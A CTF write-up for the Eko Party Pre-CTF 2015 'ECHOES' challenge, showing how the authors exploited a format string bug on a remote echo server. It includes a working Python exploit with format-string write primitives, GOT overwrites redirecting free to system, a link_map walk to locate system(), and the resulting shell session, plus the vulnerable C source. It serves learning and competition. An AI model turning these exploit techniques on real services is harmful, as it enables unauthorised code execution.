---
layout: post
title: "Eko Party Pre-CTF 2015 ECHOES"
date: 2015-09-21 18:32:11 -0400
author: [barrebas, superkojiman]
comments: true
categories: [ekoparty]
---

### Solved by barrebas and superkojiman

Where on earth shall we begin? This one kept us busy for quite some time. The challenge gives no binary, just an address to connect to. Upon connecting, we get some kind of echo server. We quickly noticed a string format vulnerability:

```
$ nc challs.ctf.site 20002
<Simple loop greetings v1.3.3.7>
[!] Type bye to quit
Enter your name: %17$s
Hi 3k0_p4rty_2015!
```

However this wasn't the flag. As we'll see later, this was part of the challenge. We started dumping the entire binary using the string format vuln. Our format string can be found at offset 8 with 1 byte of padding:

bAAAA%8$x

```
nc challs.ctf.site 20002
<Simple loop greetings v1.3.3.7>
[!] Type bye to quit
Enter your name: bAAAA%8$x
Hi bAAAA41414141
```

From the raw dump, we reconstructed parts of the binary. We came across a string that said "OMG! Well done, here's your flag" or something along those lines. Looking through the raw dump, we found where that string is referenced. Disassembling with radare2 gave us this:


```
bas@tritonal:~$ rasm2 -d -o 0x13370861 -
7517c7442404970a37138d45e7890424e86afcffff85c074188d45e789442404c704249a0a3713e883fcffffe9a52a2a2ac70424a20a3713e872fcffff8d45e7890424e867fcffffc70424a60a3713e8cbfcffff8d45e789442404c70424a70a3713e828fcffff85c07566c70424c40a3713e838fcffffa10821371389442404c70424c1203713e8f0fdffff8945dca10821371389442404c70424cc2037130cd8fdffff8945e08b4545dc890424e8f6fbffff8b45dc890424
disassemble error at offset 162
jnz 0x1337087a
mov dword [esp+0x4], 0x13370a97
lea eax, [ebp-0x19]
mov [esp], eax
call dword 0x133704e0
test eax, eax
jz 0x13370892
lea eax, [ebp-0x19]
mov [esp+0x4], eax
mov dword [esp], 0x13370a9a ; 
call dword 0x13370510       ; puts? (value in got is 0xb7e76c40)
jmp dword 0x3d613337
mov dword [esp], 0x13370aa2 ; Hi
call dword 0x13370510
lea eax, [ebp-0x19]
mov [esp], eax
call dword 0x13370510
mov dword [esp], 0x13370aa6
call dword 0x13370580       ; ? (value in got is 0xb7e8ec10)
lea eax, [ebp-0x19]
mov [esp+0x4], eax
mov dword [esp], 0x13370aa7 ; Welcome to ekoparty 2015!
call dword 0x133704f0       ; strcmp? (value in got is 0xb7f60b60)
test eax, eax
jnz 0x13370932
mov dword [esp], 0x13370ac4 ; OMG! nice work, your flag is:
call dword 0x13370510       ; puts?
mov eax, [0x13372108]       ; -> 0x13373008, contains '47fa'
mov [esp+0x4], eax
mov dword [esp], 0x133720c1 ; qs'HG, 7173271f..
call dword 0x133706dd       ; see below
mov [ebp-0x24], eax
mov eax, [0x13372108]
mov [esp+0x4], eax
mov dword [esp], 0x133720cc ; 0x1d0a0c56
or al, 0xd8
std
invalid
```

Since our input can never be larger than 12 bytes, we can never win the strcmp with `Welcome to ekoparty 2015`. From here, we tried a lot of things. The 12 char input limit was annoying, cos we couldn't really write anything, anywhere:

`A\xde\xad\xbe\xef%255c%8$hn` was 15 chars... So we set out to make a write() function using the format string vuln. 

On the stack, there are many DWORDS. Some of them contain stack addresses. Some of those addresses refer to other stack addresses (they're usually stack frame pointers). Using three memory positions, we could construct a write function using format string argument 25, 61 and 124 (ASLR is off so the addresses remain constant). Here's how:

$25 contains the address of $61. Let's assume $25 contains 0xfffff080.

$61 is at 0xfffff080 and contains 0xfffff1a0, which is $124 (math doesn't work out but bear with me). 

$124 contains nothing of interest, and isn't used by the binary. 

If we now use the format string, we use $61 to write to $124, and $25 to update $61. Finally, once we've written out an address in $124, we can use the format string to write to that location. 

Let's assume we want to write 0x41414141 to 0x804b020. We first do this:

```
%32c%61$hhn (write 0x20 to 0xfffff1a0). 
```

Then, we update the pointer at $61 by writing to $25:

```
%161c%25$hhn
```

So $61 will now contain 0xfffff1a1. Then we write to $124 again via $61:

```
%176c%61$hhn (write 0xb0 to 0xfffff1a1). 
```

Etc until we have 0x804b020 at $124. Then we write using $124:

```
%65c%124$hhn
```

And we'll have written the first byte to 0x804b020. We repeat this process for the other bytes...

With our new and shiny write() function we set out to break this challenge. We first tried truncating the string "Welcome to ekoparty 2015!" in memory, so we could have an input that would fit the 12 char limit. Writing to that location didn't work, presumably cos that string was in non-writeable memory. Remember, we needed to enter the code path here:

```
mov dword [esp], 0x13370aa7 ; Welcome to ekoparty 2015!
call dword 0x133704f0       ; strcmp? (value in got is 0xb7f60b60)
test eax, eax
jnz 0x13370932
mov dword [esp], 0x13370ac4 ; OMG! nice work, your flag is:
call dword 0x13370510       ; puts?
mov eax, [0x13372108]       ; -> 0x13373008, contains '47fa'
mov [esp+0x4], eax
mov dword [esp], 0x133720c1 ; qs'HG, 7173271f..
call dword 0x133706dd       ; see below
mov [ebp-0x24], eax
mov eax, [0x13372108]
mov [esp+0x4], eax
mov dword [esp], 0x133720cc ; 0x1d0a0c56
```

We dumped and reversed the function at `0x133720cc`, which apparently decodes the flag. However, we where only able to get the pieces `EKO{` and `b4by`. The dump process wasn't perfect, so we continued. 

So how could we get strcmp() to return 0? By overwriting the value in the got with a location that does `xor eax, eax; ret`. We dumped bytes around the strcmp pointer (ASLR was off so libc was at a static position) and indeed, we identified a rop-like gadget that did just that! Careful overwriting of the got pointer of strcmp in two steps was necessary, but again we lucked out: strcmp was at 0xb7f60b60, the `xor eax, eax` gadget was at 0xb7f61fc4. At 0xb7f61c60, there was this perfect gadget:

```
movzx ecx, byte [eax+0x5]
movzx eax, byte [edx+0x5]
sub eax, ecx
ret
```

In two steps, we overwrote strcmp (we can't have the got pointer pointing to illegal instructions, cos that would make the binary crash before we can overwrite the next value!) with the xor eax gadget... and we got something like this:

```
OMG! nice work, your flag is: EKO{
```

And then nothing?! We overwrote the free() got pointer with puts and this dumped more text, convincing us that the overwrite was working correctly. This lead us to believe the binary was broken... Which indeed it turned out to be, later on. 

Next, loads of failed attempts later, we stumbled upon [this writeup of another challenge](https://wapiflapi.github.io/2014/11/17/hacklu-oreo-with-ret2dl-resolve/) that uses ret2dl. In other words, abuse the symbol resolver. Quickly after that, we found another good writeup, using a slightly easier technique. It [traverses the link_map](https://github.com/mrmacete/writeups/tree/master/wapiflapi-exrs/sploit/s7) found in memory to grab `system()`. 

This turned out to work. We traversed the link_map by hand, adjusting the leaked bytes from time to time (remember, printf chokes on nul bytes).

At the start of the got, we find these bytes:

```
0x13371f14 ; .dynamic
0xb7fff938 ; *link_map
0xb7ff24f0 ; *dl-resolve
```

We take 0xb7fff938, the *link_map, and dump from there. link_map looks like this:

```c
struct link_map
  {
    /* These first few members are part of the protocol with the debugger.
       This is the same format used in SVR4.  */

    ElfW(Addr) l_addr;          /* Base address shared object is loaded at.  */
    char *l_name;               /* Absolute file name object was found in.  */
    ElfW(Dyn) *l_ld;            /* Dynamic section of the shared object.  */
    struct link_map *l_next, *l_prev; /* Chain of loaded objects.  */
  };
```

So at 0xb7fff938 we find:
```
0x746e450a ; base_addr.. not correct due to printf
0xb7fffc24 ; name! empty
0x13371f14 ; the bin itself... not useful.
0xb7fffc28 ; ptr->next
```

This is the binary. On to the next one at 0xb7fffc28, which was linux-gate... Then the next one was indeed libc! This was confirmed by reading link_map->l_name. We now had the dynamic section of libc, time to parse it for system. Soon, using the printf format string vulnerability and a messy python script, we were dumping symbols. After about an hour, we hit the jackpot:

```
[+] Opening connection to challs.ctf.site on port 20002: Done
0xb7e2dec8 0x0
0xb7e2ded8 0x1da8
1768709983 __li
0x0
0xb7e2dee8 0xbde
1819570783 _rtl
0x0
0xb7e2def8 0x45d1
1768709983 __li
0x0
0xb7e2df08 0x13f4
...
0xb7e2f948 0x3176
signal
0xb7e2f9a8 0xeab
puts
0xb7e30208 0xa3e
<empty>

0xb7e30588 0x3063
__libc_system
Enter your name:
[!] found system!0x3fcd0 0xb7e69cd0
```

We had the address of system! Now, the plan of attack was as follows:

- write `/bin/sh` to 0x13373008, which gets used in a free() call
- overwrite free@got with system
- set strcmp to the `xor eax, eax; ret` gadget
- receive shell

This *almost* worked out, but we set strcmp to 0xb7f61f60 and that turned out to be enough. We landed a shell!

The poc we used:

```python
import socket, struct, telnetlib, time
from pwn import *

context(arch='i386', os='linux')
def p(x):
        return struct.pack('<I', x)

def read1(address):
    conn.send("%64c%25$hhn")           # 0xbffff940
    conn.recv(200)
    conn.send("%"+str(256)+"c%61$hhn")           # set byte at 0xbf..40 to '3c'
    conn.recv(300)
    
    if (address & 0xff):
        conn.send("%64c%25$hhn")           # 0xbffff940
        conn.recv(200)
        conn.send("%"+str(address & 0xff)+"c%61$hhn")           # set byte at 0xbf..40 to '3c'
        conn.recv(300)

    conn.send("%65c%25$hhn")           # next byte, 0xbffff941
    conn.recv(200)
    conn.send("%"+str((address >> 8) & 0xff)+"c%61$hhn")           # set byte at 0xbf..41 to '20'
    conn.recv(300)

    conn.send("%66c%25$hhn")           # next byte, 0xbffff942
    conn.recv(200)
    conn.send("%"+str((address >> 16) & 0xff)+"c%61$hhn")           # set byte at 0xbf..42 to '37'
    conn.recv(300)

    conn.send("%67c%25$hhn")           # final byte, 0xbffff943
    conn.recv(200)
    conn.send("%"+str((address >> 24) & 0xff)+"c%61$hhn")           # set byte at 0xbf..43 to '13'
    conn.recv(300)

    conn.send("%124$s")
    
    data = conn.recv(200)
    if data[4:7] == 'Ent':
        return 0
    return ord(data[3:4])

def read4(address):
    value = 0
    for i in range(4):
        #value <<= 8
        value += read1(address+i) << (8*i)
        
    return value


def leak(address):
    conn.send("%64c%25$hhn")           # 0xbffff940
    conn.recv(200)
    conn.send("%"+str(256)+"c%61$hhn")           # set byte at 0xbf..40 to '3c'
    conn.recv(300)
    
    if (address & 0xff):
        conn.send("%64c%25$hhn")           # 0xbffff940
        conn.recv(200)
        conn.send("%"+str(address & 0xff)+"c%61$hhn")           # set byte at 0xbf..40 to '3c'
        conn.recv(300)

    conn.send("%65c%25$hhn")           # next byte, 0xbffff941
    conn.recv(200)
    conn.send("%"+str((address >> 8) & 0xff)+"c%61$hhn")           # set byte at 0xbf..41 to '20'
    conn.recv(300)

    conn.send("%66c%25$hhn")           # next byte, 0xbffff942
    conn.recv(200)
    conn.send("%"+str((address >> 16) & 0xff)+"c%61$hhn")           # set byte at 0xbf..42 to '37'
    conn.recv(300)

    conn.send("%67c%25$hhn")           # final byte, 0xbffff943
    conn.recv(200)
    conn.send("%"+str((address >> 24) & 0xff)+"c%61$hhn")           # set byte at 0xbf..43 to '13'
    conn.recv(300)

    conn.send("%124$s")
    data = conn.recv(200)
    return data[3:]
        
def write1(what, where):
#       argument 25 contains 0xbffff844,
#                               which points to 0xbffff958
#       so we can use 25 to modify position 61 to write something on the stack!
#       addr = 0xbffff758 # = argument 2
    conn.send("%64c%25$hhn")           # 0xbffff940
    conn.recv(200)
    conn.send("%"+str(where & 0xff)+"c%61$hhn")           # set byte at 0xbf..40 to '3c'
    conn.recv(300)

    conn.send("%65c%25$hhn")           # next byte, 0xbffff941
    conn.recv(200)
    conn.send("%"+str((where >> 8) & 0xff)+"c%61$hhn")           # set byte at 0xbf..41 to '20'
    conn.recv(300)

    conn.send("%66c%25$hhn")           # next byte, 0xbffff942
    conn.recv(200)
    conn.send("%"+str((where >> 16) & 0xff)+"c%61$hhn")           # set byte at 0xbf..42 to '37'
    conn.recv(300)

    conn.send("%67c%25$hhn")           # final byte, 0xbffff943
    conn.recv(200)
    conn.send("%"+str((where) >> 24 & 0xff)+"c%61$hhn")           # set byte at 0xbf..43 to '13'
    conn.recv(300)

    # write byte
    if ord(what) < 100:
        conn.send("%"+str(ord(what))+"c%124$hhn")
    else:
        conn.send("%"+str(ord(what))+"c%124$hn")
    conn.recv(300)
    
def writebytes(what, where):
    for i in range(len(what)):
        write1(what[i], where+i)
        
global conn
conn = remote('challs.ctf.site', 20002)
conn.recv(200)

print "[+] writing /bin/sh to 0x13373008"
writebytes('/bin/sh', 0x13373008)

print "[+] writing system() to 0x13372020"
writebytes(struct.pack('I', 0xb7e69cd0), 0x13372020)

print "[+] fucking up strcmp()"
writebytes("\x1f", 0x13372011)

conn.interactive()
```

Yeah. Pretty horrible. 

```
bas@tritonal:~/bin/ekoparty-ctf/pwn20$ python pwnpoc.py 
[+] Opening connection to challs.ctf.site on port 20002: Done
[+] writing /bin/sh to 0x13373008
[+] writing system() to 0x13372020
[+] fucking up strcmp()
[*] Switching to interactive mode
$ id
$ id
uid=1001(simple) gid=1001(simple) groups=1001(simple)
$ cd /home/simple
$ ls -al
total 68
drwxr-x--- 2 simple simple  4096 Sep 17 13:45 .
drwxr-xr-x 6 root   root    4096 Sep 12 21:10 ..
-rw------- 1 simple simple   145 Sep 12 21:13 .bash_history
-rw-r--r-- 1 simple simple   220 Oct  7  2014 .bash_logout
-rw-r--r-- 1 simple simple  3637 Oct  7  2014 .bashrc
-rw-r--r-- 1 simple simple   675 Oct  7  2014 .profile
-rwxr-xr-x 1 root   root   27095 Nov 17  2011 checksec.sh
-rw-r--r-- 1 simple simple    35 Sep 14 23:37 flag
-rw-r----- 1 root   simple  1904 Aug 27 01:08 fmt_001.c
-rwxr-x--- 1 root   simple  5776 Aug 27 01:08 greetings
Hi id

OMG! nice work, your flag is: ^\x10LnBye!
[*] Got EOF while reading in interactive
$  
```

After 10 seconds, we got kicked out, but that was enough time to grab some files. Sadly, the flag file was not the flag... someone planted it there (thanks! but no thanks). So we grabbed the C source file:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include  <signal.h>

char *mkey;
unsigned char mkey_crypt[] = { "\x07\x5b\x54\x03\x40\x0f\x4c\x1a\xb2\x0b\x0c\x0b\x04\x77\x1e\x24\x4c\x79\x42\xe7\x2c\xb4\xbf\xa0\x40\x7a\x79\x7a\x32\x0c\x68\xb9\x32\xb7\xf0\x62\xa7\xac\xa6\xe0\x68\x6a\x6f\x54\x28\x59\xa8\x3d\xee\x97\x04\x93\x9f\xcd\xf0\x5b\x0a\x08\x0b\x3e\x5f\xcd\x5f\xaf" };  
unsigned char fmt[] = { "\x71\x73\x27\x1f\x1d\x48\x47" };
unsigned char flag[] = { "\x56\x0c\x0a\x1d\x67\x08\x42\x18\x57\x5c\x53\x4f\x1a\x04\x72\x21\x18\x3a\x31\x05\x49\x26\x2c\x18\x09\x1e\x1a\x70\x5c\x6b" };

char *decrypt(const char *msg, const char *key)
{
    int len_key = strlen(key);
    int len_msg = strlen(msg);
    int i, j;
    char *out = (char *)malloc(len_key + 1);
    if (!out)
    {
        printf("WTF no memory :s");
        return NULL;
    }
    for (i = 0; i < len_msg && i < sizeof(len_msg); i++)
    {
        out[i] = msg[i] ^ (i + key[i%len_key]);
    }
    return out;
}

void handler(int num)
{
    puts("Bye!");
    exit(-1);
}

void process()
{
    char buff[13];
    puts("<Simple loop greetings v1.3.3.7>");
    puts("[!] Type bye to quit");
    while (1)
    {
        alarm(10);
        printf("Enter your name: ");
        fflush(stdout);
        memset(buff, 0, sizeof(buff));
        read(0, buff, sizeof(buff) - 1);
        if (strstr(buff, "bye"))
        {
            puts("Bye!");
            break;
        }
        if (strstr(buff, "%n") || strstr(buff, "%N"))
        {
            //p: %s\n", buff);
            break;
        }
        printf("Hi ");printf(buff);puts("");
        if (!strcmp("Welcome to ekoparty 2015!", buff))
        {
            printf("OMG! nice work, your flag is: ");
            char *fmt_ = decrypt(fmt, mkey);
            char *flag_ = decrypt(flag, mkey);
            printf(fmt_, flag_);
            free(fmt_);
            free(flag_);
            break;
        }
    }
}

//gcc -m32 Wl,-Ttext-segment=0x13370000 -o greetings fmt_001.c ; strip greetings
int main(int argc, char **argv)
{
    signal(SIGALRM, handler);
    mkey = decrypt(mkey_crypt, "3k0_p4rty_2015!");
    process();
    free(mkey);
}
```

Spot the mistake!

Found it? Yeah:

```
for (i = 0; i < len_msg && i < sizeof(len_msg); i++)
```

Thanks. Anyway, we reimplemented this file in Python (honestly couldn't get the C program to run without segfaulting, bleh).

```python
def decrypt(msg, key):
    out = ""
    
    for i in range(len(msg)):
        out += chr(ord(msg[i]) ^ (ord(key[i % len(key)]) + i))
        
    return out
    

mkey = decrypt("\x07\x5b\x54\x03\x40\x0f\x4c\x1a\xb2\x0b\x0c\x0b\x04\x77\x1e\x24\x4c\x79\x42\xe7\x2c\xb4\xbf\xa0\x40\x7a\x79\x7a\x32\x0c\x68\xb9\x32\xb7\xf0\x62\xa7\xac\xa6\xe0\x68\x6a\x6f\x54\x28\x59\xa8\x3d\xee\x97\x04\x93\x9f\xcd\xf0\x5b\x0a\x08\x0b\x3e\x5f\xcd\x5f\xaf", "3k0_p4rty_2015!")

print decrypt("\x71\x73\x27\x1f\x1d\x48\x47", mkey)
print decrypt("\x56\x0c\x0a\x1d\x67\x08\x42\x18\x57\x5c\x53\x4f\x1a\x04\x72\x21\x18\x3a\x31\x05\x49\x26\x2c\x18\x09\x1e\x1a\x70\x5c\x6b", mkey)
```

Which *finally* gave us the flag:

{% raw %}
```
EKO{%s}
b4by_3xpl0it_FMT_str1ng_FTW!#$
```
{% endraw %}

The flag was `EKO{b4by_3xpl0it_FMT_str1ng_FTW!#$}`. Too bad the challenge was broken, nice to learn a new technique!

